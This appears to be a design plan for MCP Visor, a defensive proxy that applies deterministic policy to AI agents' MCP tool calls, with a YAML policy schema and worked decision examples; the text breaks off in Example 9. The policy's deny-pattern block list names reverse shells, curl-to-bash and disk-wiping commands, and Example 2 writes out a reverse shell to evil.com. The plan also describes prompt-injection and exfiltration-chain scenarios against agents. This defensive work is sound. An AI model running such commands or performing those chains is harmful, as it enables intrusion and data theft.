# MCP Visor: Technical Plan

> Runtime Policy Enforcement and Audit Control Plane for MCP Tool Execution

**Status**: MVP Complete (Phases 0-7 done, Phase 8 in progress)  
**Last Updated**: 2026-05-25

## MVP Completion Status

| Phase | Description | Status | Commit |
|-------|-------------|--------|--------|
| 0 | Research and design | [x] Done | — |
| 1 | Basic MCP proxy | [x] Done | `f523b10` |
| 2 | Policy engine | [x] Done | `e98e7ca` |
| 3 | Audit logging | [x] Done | `f87ca34` |
| 4 | Chain detection | [x] Done | `3d11ce7` |
| 5 | Redaction engine | [x] Done | `8e8ab9e` |
| 6 | Approval workflow | [x] Done | `8284828` |
| 7 | Demo environment | [x] Done | `c293dca` |
| 8 | Hardening, documentation, release | [ ] In progress | — |  
**Version**: 1.0  
**Author**: Security Architecture Working Draft

---

## 1. Project Positioning

### What mcp-visor Is

MCP Visor is a deterministic, policy-driven runtime control plane that sits between AI agents/LLM clients and MCP servers. It intercepts MCP tool calls before execution, evaluates them against a configurable policy engine, and enforces allow/deny/approval decisions in real time. It is the enforcement layer for MCP tool access.

### What mcp-visor Is Not

- **Not an evaluator.** It does not test LLMs, score their security behavior, or generate assessment reports. That is the responsibility of [mcp-llm-security-evaluator](https://github.com/themayursinha/mcp-llm-security-evaluator).
- **Not a scanner.** It does not scan existing MCP configurations for risks or diff tool catalogs for drift.
- **Not a red-team harness.** It does not simulate malicious prompts or measure LLM compliance.
- **Not a reporting dashboard.** It produces audit logs, not compliance reports or trend analysis.
- **Not a guaranteed "unbreachable" system.** It is a practical enforcement layer with known limitations. Security is about defense-in-depth, not absolutes.

### Clean Separation

| Concern | mcp-llm-security-evaluator | mcp-visor |
|---|---|---|
| Purpose | "Tells you what can go wrong" | "Stops dangerous MCP tool execution at runtime" |
| Mode | Offline analysis and simulation | Online/runtime enforcement |
| LLM interaction | Tests LLM responses to prompts | Does not interact with LLMs |
| MCP integration | Simulates mock tool calls | Proxies real MCP protocol traffic |
| Policy role | Assesses policy compliance of configs | Enforces policy before tool execution |
| Output | Reports, scores, findings | Allow/deny/approval decisions, audit logs |
| When it runs | CI/CD, on-demand scans | Every tool call in production |

### One-Line Positioning

> "Runtime policy enforcement and audit control plane for MCP tool execution."

---

## 2. Core Problem Statement

### The Security Problem

AI agents are increasingly deployed with access to deterministic enterprise tools: filesystems, APIs, source code repositories, databases, shells, browsers, ticketing systems, Slack, Gmail, GitHub, GitLab, cloud resource APIs, and more. These agents are connected to these tools through the Model Context Protocol (MCP).

However, AI agents are fundamentally probabilistic systems driven by language models. They are susceptible to:

1. **Prompt injection** — Malicious instructions embedded in data (emails, documents, web pages, code comments) that manipulate the agent into performing unintended actions.
2. **Goal misalignment** — The agent pursues a task in a way that violates security boundaries, even without an attacker.
3. **Tool over-provisioning** — Agents receive more tool access than they need, because tool registration is often binary (access to a server grants access to all its tools).
4. **Dangerous tool chains** — Individually benign tools can be combined to exfiltrate data (e.g., `file_read` → `http_post`, `database_query` → `slack_send`).
5. **Confused deputy** — An agent with legitimate tool access is tricked into using that access for malicious purposes.

### The Enforcement Gap

Current MCP architecture connects clients to servers directly. There is no standard enforcement point. Security checks, if they exist, are ad-hoc and embedded in agent code or server implementations. There is no:

- Centralized policy decision point for MCP tool calls
- Standard mechanism to require human approval for dangerous operations
- Runtime detection of tool chains that combine to become dangerous
- Redaction of sensitive data before it leaves the tool boundary
- Deterministic audit trail that survives compromise of the LLM

MCP Visor fills this gap by sitting **in the request path** as a proxy. While the LLM may be compromised by prompt injection, the visor applies deterministic, non-AI policy rules. The policy engine does not use an LLM to make decisions. It uses exact match, prefix/suffix, regex, and rule-chain logic that cannot be sweet-talked.

### Why Deterministic Enforcement Matters

Prompt injection can manipulate an LLM into attempting to call a dangerous tool. The LLM may produce a plausible, seemingly legitimate tool call that is actually malicious. A deterministic policy engine — one that does not use an LLM itself — cannot be tricked by the same prompt injection. It evaluates the tool name, parameters, server, chain context, and policy rules using simple, auditable logic. This provides a **trusted computing base** for MCP tool execution.

---

## 3. MVP Scope

### v1 Feature Set

#### 1. MCP Proxy / Gateway
A transparent proxy that implements the MCP protocol on both sides:
- Accepts connections from MCP clients (AI agents / LLM hosts)
- Forwards to configured MCP servers
- Intercepts `tools/list`, `tools/call`, and other MCP messages

#### 2. Tool Call Interception
Intercept every `tools/call` request in the MCP protocol stream. Extract:
- Tool name
- Server name
- Call arguments
- Session/agent identity metadata
- Sequence context (previous calls in the session)

#### 3. Policy Engine
A deterministic, stateless (or config-state-only) policy evaluation pipeline:
- Load policy rules from YAML/JSON configuration
- Evaluate each intercepted call against all applicable rules
- Return a decision: `allow`, `deny`, `redact_then_allow`, `require_approval`
- Policy hot-reload without restart
- Default-deny posture for tool servers not in the policy

#### 4. Tool Allowlist and Denylist
- Explicit allowlist of servers and tools
- Explicit denylist of servers and tools
- Default action configuration (allow/deny for unknown tools)
- Server-level and tool-level granularity

#### 5. Risk Classification for Tools
Classify each tool into risk tiers based on declarative rules:
- `critical` — shell execution, cloud IAM, secrets access
- `high` — database write, file write, HTTP POST, Slack/Gmail send
- `medium` — database read, file read, web search
- `low` — search, list, help, describe
- `unknown` — default for tools not in the risk registry

Risk classification is used to drive approval requirements and chain detection.

#### 6. Sensitive Data Redaction
Before forwarding a tool call to a server, scan arguments for:
- API keys (patterns: `sk-`, `ghp_`, `xoxb-`, etc.)
- Tokens and credentials
- Secrets matching regex patterns from policy
- Internal URLs and hostnames
- IP addresses in private ranges

Redaction produces two outputs:
- The sanitized call forwarded to the server
- An audit event recording what was redacted

Also scan tool outputs for sensitive data before returning to the client:
- If a file read returns `.env` contents, redact before passing to the LLM
- If a database query returns credential rows, redact or block

#### 7. Human Approval Requirement for Dangerous Tools
When a tool call requires approval:
1. The proxy holds the call
2. An approval notification is emitted (stdout, webhook, or file event)
3. A designated approver confirms or denies
4. On approval, the call proceeds; on denial, an error is returned to the client
5. Timeout handling: if not approved within N seconds, deny by default

v1 approval mechanism: file-based or CLI-based (watch a directory or stdin). v2+ can include Slack bot, web dashboard, etc.

#### 8. Tool-Chain Detection
Track sequences of tool calls within a session. Detect patterns like:

| Sequence | Risk | Rationale |
|---|---|---|
| `file_read` → `http_post` | High | Potential data exfiltration |
| `file_read` → `slack_send` | High | Potential data exfiltration to messaging |
| `database_query` → `http_post` | Critical | Database contents sent to external endpoint |
| `secret_read` → `browser_open` | Critical | Secrets leaked via browser |
| `file_read` → `file_write` | Medium | Potential file tampering |
| `read` → `delete` | Medium | Read-then-destroy pattern |

Chains are detected using a sliding window (configurable size, default 5-10 calls) with a state machine that tracks whether a sensitive source has been accessed and whether a subsequent call is an outbound sink.

When a dangerous chain is detected:
- Deny the sink call
- Log a high-severity audit event
- Optionally terminate the session

#### 9. Redacted Audit Logging
Every tool call produces an audit event:
- Timestamp
- Agent/session identifier
- Server name
- Tool name
- Arguments (redacted — secrets replaced with `[REDACTED]`)
- Policy decision (allow/deny/approval)
- Risk level
- Chain context (previous tools in session)
- Result preview (redacted)

Logs are written to a structured JSON file. v1 uses local file output. v2+ can support syslog, SIEM export (Splunk/Elastic), and structured logging backends.

#### 10. Local Developer Mode
- Zero-config startup for local development
- Uses a sample policy with sensible defaults
- Starts a built-in demo MCP server with various tools
- Displays decisions in real time on stdout
- Suitable for demos, documentation, and quick testing

#### 11. Example Demo MCP Server
A simple built-in MCP server with example tools at various risk levels:
- `file_read` (medium risk)
- `file_write` (high risk)
- `shell_exec` (critical risk)
- `http_fetch` (medium risk)
- `database_query` (high risk)
- `slack_send_message` (high risk)
- `github_create_issue` (medium risk)
- `env_read` (high risk)

#### 12. Example Malicious Prompt Scenarios
Pre-written prompt injection examples that demonstrate the visor blocking:
1. Prompt injection requesting shell command execution (blocked)
2. Prompt injection requesting reading secrets and posting to external URL (chain blocked)
3. Prompt injection requesting Slack message with file contents (chain blocked)
4. Prompt injection requesting `.env` file read (redacted)
5. Prompt injection requesting cloud IAM change (approval required)

#### 13. Example Policies
Policy files demonstrating:
- Allowlist-only posture (default deny for all tools)
- Medium-security posture (allow read, deny write, require approval for network)
- Full approval posture (all tools require human approval)
- Per-identity policies (different agents have different tool access)
- Time-based policies (tools allowed only during business hours)
- Source-repo-based policies (GitHub tools limited to specific repositories)

#### 14. Clear README and Architecture Diagram
- Problem statement
- Architecture diagram
- Quickstart (3 commands to run)
- Policy examples
- Demo walkthrough
- Threat model summary
- Comparison with evaluator
- Roadmap
- Limitations

---

## 4. Non-Goals for v1

The following are explicitly out of scope for v1. They may appear on future roadmaps.

- **Hypervisor-level / bare-metal enforcement.** There is no plan to implement a type-1 hypervisor or kernel module in v1 (or v2, or v3). This is a userspace proxy.
- **eBPF / syscall-level telemetry.** The proxy operates at the MCP protocol level, not the kernel level. Runtime sandboxing of tool execution at the syscall level is a potential v3/v4 item.
- **WASI / sandbox runner isolation.** Running tool binaries in WebAssembly sandboxes or containers is a future enhancement, not v1.
- **Cryptographic attestation of policy decisions.** Signed audit logs and cryptographic non-repudiation are a v2 item.
- **Multi-tenant SaaS deployment.** v1 is a single-instance proxy for local or small-team use. Multi-tenancy, authentication, and RBAC are not in scope.
- **Web dashboard for approval or monitoring.** v1 uses CLI and file-based interfaces. A web UI is a v2/v3 item.
- **Integration with 10+ MCP server types.** v1 supports the standard MCP protocol over stdio and HTTP transports. Custom server-specific adapters are out of scope.
- **Dynamic policy generation from evaluator findings.** While the evaluator can inform policy creation, v1 does not auto-generate visor policies from evaluator reports.
- **Real-time Slack/Teams/email approval notifications.** v1 uses file-based or CLI approval. Webhook-based notifications can come in v2.
- **Scalability to thousands of concurrent sessions.** v1 is designed for single-agent or small-team use. Horizontal scaling is not a v1 concern.
- **Formal verification of the policy engine.** The policy engine is straightforward deterministic logic. Formal verification is not planned.
- **FIPS 140-2 compliance.** Cryptographic modules are not a focus of v1.

---

## 5. Architecture

### Component Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                      AI Agent / MCP Client                   │
│                   (Claude Desktop, Copilot, etc.)            │
└───────────────────────────┬─────────────────────────────────┘
                            │ MCP Protocol (stdio/HTTP)
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                        mcp-visor                              │
│                                                               │
│  ┌─────────────┐    ┌──────────────────┐                     │
│  │ MCP Ingress │───▶│  Interceptor     │                     │
│  │  (stdio/net)│    │  (parse MCP msg) │                     │
│  └─────────────┘    └────────┬─────────┘                     │
│                               │                               │
│                               ▼                               │
│  ┌──────────────────────────────────────────────┐            │
│  │              Policy Engine                    │            │
│  │                                               │            │
│  │  ┌──────────┐  ┌──────────┐  ┌────────────┐ │            │
│  │  │Tool      │  │Risk      │  │Chain       │ │            │
│  │  │Registry  │  │Classifier│  │Detector    │ │            │
│  │  └──────────┘  └──────────┘  └────────────┘ │            │
│  │                                               │            │
│  │  ┌──────────┐  ┌──────────┐  ┌────────────┐ │            │
│  │  │Redaction │  │Approval  │  │Argument    │ │            │
│  │  │Engine    │  │Engine    │  │Validator   │ │            │
│  │  └──────────┘  └──────────┘  └────────────┘ │            │
│  │                                               │            │
│  └──────────────────────┬───────────────────────┘            │
│                         │                                     │
│                         ▼                                     │
│  ┌──────────────────────────────────────────────┐            │
│  │           Decision Engine                     │            │
│  │  Output: allow / deny / redact / approve     │            │
│  └──────────────────────┬───────────────────────┘            │
│                         │                                     │
│                    ┌────┴────┐                                │
│                    ▼         ▼                                │
│              ┌──────────┐  ┌──────────┐                       │
│              │ Audit    │  │ MCP      │                       │
│              │ Logger   │  │ Egress   │                       │
│              └──────────┘  └────┬─────┘                       │
│                                 │                              │
└─────────────────────────────────┼──────────────────────────────┘
                                  │ MCP Protocol (stdio/HTTP)
                                  ▼
┌─────────────────────────────────────────────────────────────┐
│                       MCP Server                              │
│         (filesystem, database, GitHub, Slack, etc.)          │
└─────────────────────────────────────────────────────────────┘
```

### Data Flow: Tool Call Interception

```
1. MCP Client sends tools/call { name: "file_read", args: { path: "/etc/passwd" } }

2. mcp-visor Ingress receives the message

3. Interceptor parses the MCP message, extracts:
   - tool_name = "file_read"
   - server_name = "filesystem-server"
   - arguments = { path: "/etc/passwd" }
   - session_id = "session-abc123"
   - agent_id = "claude-desktop-main"

4. Policy Engine evaluates:

   a. Tool Registry lookup:
      - Is "filesystem-server" in the configured server list? Yes.
      - Is "file_read" registered as a tool of "filesystem-server"? Yes.
      - Is the server allowlisted? Yes.
      - Is the tool allowlisted? Yes.
      - Is the tool denylisted? No.

   b. Risk Classifier:
      - "file_read" -> classified as "medium" risk

   c. Argument Validator:
      - Does path match sensitive patterns? Yes, "/etc/passwd" matches.
      - Policy rule: "file_read: deny /etc/passwd, /etc/shadow, .env"
      - Decision: DENY

   d. Chain Detector:
      - Previous calls in session: [ ]
      - No chain concern yet (but would check if preceded by suspicious source)

5. Decision Engine aggregates: DENY (argument validation failed)

6. Audit Logger writes event:
   {
     "timestamp": "2026-05-24T10:30:00Z",
     "session_id": "session-abc123",
     "agent_id": "claude-desktop-main",
     "server": "filesystem-server",
     "tool": "file_read",
     "arguments": { "path": "[REDACTED: sensitive path]" },
     "decision": "deny",
     "reason": "Blocked access to sensitive file: /etc/passwd",
     "risk_level": "medium",
     "chain_context": []
   }

7. MCP Egress sends error response to client:
   { "error": "Tool execution denied by policy: Blocked access to sensitive file" }

8. The tool never executes. The MCP server is never contacted.
```

### Decision Flowchart

```
Intercepted tool call
        │
        ▼
┌──────────────────┐
│ Known tool?      │──No──▶ DENY (unknown tool)
└──────┬───────────┘
       │ Yes
       ▼
┌──────────────────┐
│ Tool denylisted? │──Yes──▶ DENY (explicit deny)
└──────┬───────────┘
       │ No
       ▼
┌──────────────────┐
│ Not in allowlist?│──Yes──▶ DENY (not allowlisted) [if default-deny]
└──────┬───────────┘
       │ No / default-allow
       ▼
┌──────────────────┐
│ Arguments pass   │──No──▶ DENY (argument validation failed)
│ validation?      │
└──────┬───────────┘
       │ Yes
       ▼
┌──────────────────┐
│ Dangerous chain  │──Yes──▶ DENY (chain detected)
│ detected?        │
└──────┬───────────┘
       │ No
       ▼
┌──────────────────┐
│ Sensitive data   │──Yes──▶ Redact, then continue
│ in args?         │
└──────┬───────────┘
       │ No / Redacted
       ▼
┌──────────────────┐
│ Requires         │──Yes──▶ REQUIRE_APPROVAL
│ approval?        │
└──────┬───────────┘
       │ No
       ▼
     ALLOW

After ALLOW:
       │
       ▼
┌──────────────────┐
│ Sensitive data   │──Yes──▶ Redact output before returning to client
│ in output?       │
└──────┬───────────┘
       │
       ▼
  Return result to client
```

### Key Design Principles

1. **Deterministic policy decisions.** No LLM involvement in the decision path. Policy evaluation uses exact string matching, regex, and rule-chain logic only.

2. **Fail-closed.** If the policy engine encounters an error, the default is to deny. If a tool, server, or argument cannot be validated, the call is blocked.

3. **Minimal trusted computing base.** The proxy code, policy configuration, and audit log are the minimum components that must be trusted. External dependencies are pinned and minimal.

4. **Observable.** Every decision is logged. Every denial includes a reason. Every redaction notes what was redacted.

5. **Configurable posture.** Default-deny, but configurable. Allows teams to start strict and relax as needed, or start permissive and tighten.

6. **Session-aware.** The proxy tracks tool call sequences per session to detect chains. Session state is ephemeral (in-memory) and lost on restart. No persistent state beyond audit logs.

---

## 6. Policy Model

### Policy Schema

```yaml
# mcp-visor policy schema v1
version: "1.0"
description: "Production policy for acme-corp agent deployment"

# Default action when no rule matches
default_action: deny  # deny | allow

# Global settings
settings:
  max_argument_size_bytes: 1048576     # 1 MB
  max_output_size_bytes: 10485760      # 10 MB
  session_max_tools: 100               # Max tools per session before session terminated
  session_timeout_seconds: 3600        # 1 hour
  approval_timeout_seconds: 300        # 5 minutes
  chain_window_size: 10                # Number of previous calls to inspect for chains
  log_level: info                      # debug | info | warn | error

# Server definitions
servers:
  - name: "filesystem"
    transport: stdio
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
        rules:
          - type: deny_path
            patterns:
              - "/etc/passwd"
              - "/etc/shadow"
              - "**/.env"
              - "**/.env.*"
              - "**/credentials*"
              - "**/*secret*"
              - "**/*.pem"
              - "**/*.key"
              - "**/id_rsa*"
              - "**/.ssh/**"
          - type: allow_path
            patterns:
              - "/home/user/projects/**"
              - "/tmp/mcp-safe/**"
          - type: max_file_size
            bytes: 10485760  # 10 MB

      - name: "file_write"
        allowed: true
        risk: high
        approval_required: true
        rules:
          - type: deny_path
            patterns:
              - "/etc/**"
              - "/usr/**"
              - "/bin/**"
              - "/boot/**"
              - "**/.git/config"
          - type: allow_path
            patterns:
              - "/home/user/projects/**"
              - "/tmp/mcp-safe/**"
          - type: max_file_size
            bytes: 5242880  # 5 MB

      - name: "file_delete"
        allowed: true
        risk: critical
        approval_required: true
        rules:
          - type: deny_path
            patterns:
              - "/etc/**"
              - "/usr/**"
              - "/home/**"
              - "/**"

  - name: "shell"
    transport: stdio
    allowed: true
    tools:
      - name: "shell_exec"
        allowed: true
        risk: critical
        approval_required: true
        rules:
          - type: deny_command_pattern
            patterns:
              - "rm\\s+-rf\\s+/"
              - "curl.*\\|.*(bash|sh)"
              - "wget.*-O.*\\|.*(bash|sh)"
              - "chmod\\s+777"
              - ">\\s*/dev/sda"
              - "mkfs\\."
              - "dd\\s+if="
              - ":(){ :|:& };:"
              - "nc\\s+-[nl]"
              - "bash\\s+-i\\s+>&"
              - "python.*socket.*connect"
              - "ssh\\s+-o.*StrictHostKeyChecking=no"
          - type: deny_command_keyword
            keywords:
              - "reverse shell"
              - "backdoor"
              - "bind shell"
          - type: allow_command_pattern
            patterns:
              - "^ls\\s"
              - "^cat\\s"
              - "^echo\\s"
              - "^git\\s(status|log|diff|branch)"
              - "^python\\s+--version"
              - "^node\\s+--version"
              - "^npm\\s+(test|lint|build)"
              - "^whoami$"
              - "^date$"
              - "^pwd$"

  - name: "slack"
    transport: http
    allowed: true
    allowed_destinations:
      - "hooks.slack.com"
    tools:
      - name: "slack_send_message"
        allowed: true
        risk: high
        approval_required: true
        rules:
          - type: require_approval_always

      - name: "slack_read_messages"
        allowed: true
        risk: medium

  - name: "github"
    transport: http
    allowed: true
    allowed_destinations:
      - "api.github.com"
    tools:
      - name: "github_create_issue"
        allowed: true
        risk: medium
        rules:
          - type: allowed_repos
            repos:
              - "acme-corp/service-a"
              - "acme-corp/service-b"
              - "acme-corp/docs"

      - name: "github_create_pr"
        allowed: true
        risk: medium
        approval_required: true
        rules:
          - type: allowed_repos
            repos:
              - "acme-corp/service-a"
              - "acme-corp/service-b"

      - name: "github_read_code"
        allowed: true
        risk: low

      - name: "github_merge_pr"
        allowed: true
        risk: high
        approval_required: true

      - name: "github_delete_repo"
        allowed: false  # Hard deny
        risk: critical

  - name: "database"
    transport: stdio
    allowed: true
    tools:
      - name: "database_query"
        allowed: true
        risk: high
        rules:
          - type: deny_query_pattern
            patterns:
              - "DROP\\s+(TABLE|DATABASE)"
              - "DELETE\\s+FROM"
              - "TRUNCATE\\s+TABLE"
              - "ALTER\\s+(TABLE|DATABASE)"
              - "GRANT\\s+"
              - "REVOKE\\s+"
              - "CREATE\\s+USER"
          - type: allow_query_pattern
            patterns:
              - "^SELECT\\s"
              - "^EXPLAIN\\s"
              - "^DESCRIBE\\s"
              - "^SHOW\\s"
          - type: max_result_rows
            rows: 1000

      - name: "database_export"
        allowed: true
        risk: high
        approval_required: true
        rules:
          - type: max_export_rows
            rows: 100

  - name: "browser"
    transport: stdio
    allowed: true
    allowed_destinations:
      - "*.acme-corp.com"
      - "docs.python.org"
      - "github.com"
      - "pypi.org"
      - "npmjs.com"
    tools:
      - name: "browser_navigate"
        allowed: true
        risk: medium
      - name: "browser_click"
        allowed: true
        risk: medium
      - name: "browser_fill_form"
        allowed: true
        risk: high
        approval_required: true

  - name: "cloud"
    transport: http
    allowed: true
    allowed_destinations:
      - "*.amazonaws.com"
    tools:
      - name: "aws_iam_create_user"
        allowed: true
        risk: critical
        approval_required: true
      - name: "aws_iam_attach_policy"
        allowed: true
        risk: critical
        approval_required: true
      - name: "aws_s3_list_buckets"
        allowed: true
        risk: low
      - name: "aws_s3_read_object"
        allowed: true
        risk: medium
      - name: "aws_s3_delete_bucket"
        allowed: false  # Hard deny
        risk: critical

  - name: "email"
    transport: http
    allowed: true
    tools:
      - name: "gmail_send"
        allowed: true
        risk: high
        approval_required: true
        rules:
          - type: deny_recipient_domain
            domains:
              - "competitor.com"
              - "personal-email.com"
          - type: allow_recipient_domain
            domains:
              - "acme-corp.com"
      - name: "gmail_read"
        allowed: true
        risk: medium
        rules:
          - type: max_emails
            count: 50

# Tool chain detection rules
tool_chains:
  # Block: read sensitive source → send to external sink
  - name: "prevent_exfiltration_via_http"
    description: "Block any read source followed by HTTP POST to external host"
    sources:
      - server: "*"
        tool_pattern: ".*(read|query|get|fetch).*"
    sinks:
      - server: "*"
        tool_pattern: ".*(http_post|upload|webhook).*"
    action: deny
    within_calls: 5

  - name: "prevent_exfiltration_via_slack"
    sources:
      - server: "*"
        tool_pattern: "(file_read|database_query)"
    sinks:
      - server: "slack"
        tool_pattern: "slack_send_message"
    action: deny
    within_calls: 3

  - name: "prevent_exfiltration_via_email"
    sources:
      - server: "*"
        tool_pattern: "(file_read|database_query|env_read)"
    sinks:
      - server: "email"
        tool_pattern: "gmail_send"
    action: deny
    within_calls: 3

  - name: "prevent_secret_leak_via_browser"
    sources:
      - server: "*"
        tool_pattern: "secret_read|env_read"
    sinks:
      - server: "browser"
        tool_pattern: "browser_navigate"
    action: deny
    within_calls: 3

  - name: "prevent_read_then_destroy"
    sources:
      - server: "*"
        tool_pattern: ".*_read$"
    sinks:
      - server: "*"
        tool_pattern: ".*_delete$|.*_rm$"
    action: require_approval
    within_calls: 5

# Identity-based policies (optional, for multi-agent setups)
identities:
  - name: "github-copilot-dev"
    description: "Standard developer agent"
    allowed_servers:
      - "filesystem"
      - "github"
      - "browser"
    allowed_tools:
      - "filesystem/file_read"
      - "filesystem/file_write"
      - "github/github_read_code"
      - "github/github_create_pr"
      - "browser/browser_navigate"

  - name: "ops-agent"
    description: "Operations agent with broader access"
    allowed_servers:
      - "filesystem"
      - "shell"
      - "database"
      - "slack"
      - "github"
      - "cloud"
    allowed_tools:
      - "filesystem/file_read"
      - "shell/shell_exec"
      - "database/database_query"
      - "slack/slack_send_message"
      - "github/github_read_code"

# Time-based restrictions (optional)
time_restrictions:
  - name: "shell_only_business_hours"
    description: "Shell access limited to business hours"
    servers: ["shell"]
    tools: ["shell_exec"]
    allowed_hours:
      - start: "09:00"
        end: "17:00"
        timezone: "America/New_York"
        days: ["monday", "tuesday", "wednesday", "thursday", "friday"]
    outside_action: require_approval

  - name: "no_deployment_on_weekends"
    servers: ["cloud"]
    tools: ["aws_iam_*"]
    denied_days: ["saturday", "sunday"]
    outside_action: deny

# Sensitive data detection patterns
redaction:
  patterns:
    - name: "openai_api_key"
      regex: "sk-[a-zA-Z0-9_-]{20,}"
      replacement: "[REDACTED: OpenAI API Key]"
    - name: "github_token"
      regex: "ghp_[a-zA-Z0-9]{36}"
      replacement: "[REDACTED: GitHub Token]"
    - name: "slack_token"
      regex: "xox[baprs]-[a-zA-Z0-9-]+"
      replacement: "[REDACTED: Slack Token]"
    - name: "aws_key"
      regex: "AKIA[0-9A-Z]{16}"
      replacement: "[REDACTED: AWS Access Key]"
    - name: "aws_secret"
      regex: "[a-zA-Z0-9+/]{40}"
      replacement: "[REDACTED: potential AWS Secret Key]"
    - name: "jwt_token"
      regex: "eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+"
      replacement: "[REDACTED: JWT Token]"
    - name: "private_key"
      regex: "-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----"
      replacement: "[REDACTED: Private Key]"
    - name: "connection_string"
      regex: "(mongodb|postgresql|mysql|redis|jdbc)://[^:]+:[^@]+@[^\\s]+"
      replacement: "[REDACTED: Database Connection String]"
    - name: "internal_ip"
      regex: "(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|172\\.(1[6-9]|2\\d|3[01])\\.\\d{1,3}\\.\\d{1,3}|192\\.168\\.\\d{1,3}\\.\\d{1,3})"
      replacement: "[REDACTED: Internal IP]"
    - name: "email_address"
      regex: "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"
      replacement: "[REDACTED: Email Address]"

  # Redact sensitive data from tool outputs before returning to client
  output_redaction: true
  output_patterns:
    - name: "secrets_in_output"
      regex: "(password|secret|token|key|credential)\\s*[:=]\\s*[\"']?([^\"'\\s]+)[\"']?"
      replacement: "$1=[REDACTED]"

  # Files whose content should always be redacted if read
  sensitive_files:
    - "**/.env"
    - "**/.env.*"
    - "**/credentials"
    - "**/secrets"
    - "**/.aws/credentials"
    - "**/.ssh/**"
    - "**/.docker/config.json"
    - "**/kubeconfig"
    - "**/.npmrc"
```

### Policy Loading and Hot-Reload

- Policy file path specified via CLI flag or environment variable (`MCP_VISOR_POLICY_PATH`)
- Policy loaded at startup from YAML file
- File watcher monitors for changes
- On change, policy is validated (YAML parse + schema validation)
- If valid, new policy is atomically swapped in
- If invalid, old policy remains active, error is logged
- Default policy embedded in binary for zero-config local mode

---

## 7. Runtime Decision Examples

### Example 1: Allow Read-Only Repository Search

**Tool call:** `file_read` with `path=/home/user/projects/acme-corp/src/main.py`  
**Session context:** No previous calls  
**Policy evaluation:**
- Tool allowlisted? Yes
- Path matches deny patterns? No
- Path matches allow patterns? Yes (`/home/user/projects/**`)
- Chain concern? No
- Sensitive data in args? No
- Approval required? No

**Decision:** ALLOW  
**Audit:** `{ "decision": "allow", "tool": "file_read", "path": "/home/user/projects/acme-corp/src/main.py", "risk_level": "medium" }`

---

### Example 2: Deny Shell Command with Reverse Shell Pattern

**Tool call:** `shell_exec` with `command=bash -i >& /dev/tcp/evil.com/4444 0>&1`  
**Session context:** No previous calls  
**Policy evaluation:**
- Tool allowlisted? Yes
- Command matches deny regex? Yes (`bash\\s+-i\\s+>&`)
- Chain concern? No
- Approval required? Yes (but denial takes precedence)

**Decision:** DENY  
**Reason:** `Command matched deny pattern: bash -i >& ...`  
**Audit:** `{ "decision": "deny", "reason": "Blocked dangerous command pattern: reverse shell detected", "risk_level": "critical" }`

---

### Example 3: Deny File Read Followed by External HTTP POST (Chain)

**Call 1:** `file_read` with `path=/home/user/projects/data.csv`  
**Decision:** ALLOW (no chain context yet)  
**Session state:** `[file_read::filesystem]`

**Call 2:** `http_post` with `url=https://external-server.com/upload`  
**Policy evaluation:**
- Tool allowlisted? Yes
- Argument validation? Passes
- Chain check: Previous call was `file_read` (sensitive source). Current call is `http_post` (outbound sink). Within 5-call window? Yes.
- Chain rule matched: `prevent_exfiltration_via_http`

**Decision:** DENY  
**Reason:** `Dangerous tool chain: file_read → http_post (potential data exfiltration)`  
**Audit:** `{ "decision": "deny", "reason": "Chain: source=file_read, sink=http_post, rule=prevent_exfiltration_via_http", "risk_level": "high" }`

---

### Example 4: Require Approval Before Sending Slack Message

**Tool call:** `slack_send_message` with `channel=#engineering, text=Deployment complete`  
**Session context:** No previous calls  
**Policy evaluation:**
- Tool allowlisted? Yes
- Argument validation? Passes
- Chain concern? No
- Approval required? Yes (configured as `require_approval_always`)

**Decision:** REQUIRE_APPROVAL  
**Action:** Proxy holds the call, emits approval prompt  
**If approved:** Call proceeds to Slack server  
**If denied/timed out:** DENY returned to client  
**Audit:** `{ "decision": "require_approval", "tool": "slack_send_message", "approval_id": "appr-xyz789" }`

---

### Example 5: Redact Secrets Before Returning Tool Output

**Tool call:** `file_read` with `path=/home/user/projects/.env`  
**Policy evaluation:**
- Tool allowlisted? Yes
- Path matches deny patterns? Yes (`**/.env` matches)
- Block? The tool is allowed but the path is sensitive

**Decision:** DENY (by path rule) — `.env` files are explicitly blocked

**Alternative scenario** — If `.env` were not explicitly denied:

**Tool call:** `file_read` with `path=/home/user/projects/config.yaml`  
**Result from server:** `database_url: postgresql://admin:SuperSecret123@db.internal:5432/prod`  
**Output redaction:** Pattern `connection_string` matched  
**Redacted output returned:** `database_url: [REDACTED: Database Connection String]`  
**Audit:** `{ "decision": "allow", "redacted": true, "fields_redacted": ["database_url"], "risk_level": "medium" }`

---

### Example 6: Deny Unknown MCP Tools by Default

**Tool call:** `some_new_tool_v2` from server `unknown-server`  
**Policy evaluation:**
- Server `unknown-server` in policy? No
- Tool `some_new_tool_v2` in any server's tool list? No
- Default action: deny

**Decision:** DENY  
**Reason:** `Tool 'some_new_tool_v2' from server 'unknown-server' is not registered in the policy`  
**Audit:** `{ "decision": "deny", "reason": "Unknown tool/server", "risk_level": "critical" }`

---

### Example 7: Allow GitHub Issue Creation Only for Approved Repos

**Tool call:** `github_create_issue` with `repo=acme-corp/service-a, title=Bug report`  
**Policy evaluation:**
- Tool allowlisted? Yes
- Repo check: `acme-corp/service-a` is in the allowed repos list? Yes

**Decision:** ALLOW

**Tool call:** `github_create_issue` with `repo=acme-corp/secret-project, title=Security audit`  
**Policy evaluation:**
- Tool allowlisted? Yes
- Repo check: `acme-corp/secret-project` is in the allowed repos list? No

**Decision:** DENY  
**Reason:** `Repository 'acme-corp/secret-project' is not in the allowlist for github_create_issue`

---

### Example 8: Deny Database Export Larger Than Threshold

**Tool call:** `database_export` with `query=SELECT * FROM users, limit=50000`  
**Policy evaluation:**
- Tool allowlisted? Yes
- Max export rows: 100
- Requested rows: 50000 (or inferred from query)

**Decision:** DENY  
**Reason:** `Export exceeds maximum rows: requested 50000, allowed 100`

---

### Example 9: Require Approval for Cloud IAM Changes

**Tool call:** `aws_iam_create_user` with `username=temp-admin`  
**Policy evaluation:**
- Tool allowlisted? Yes
- Risk level: critical
- Approval required? Yes (configured for all critical-risk cloud tools)

**Decision:** REQUIRE_APPROVAL  
**If approved:** IAM user creation proceeds  
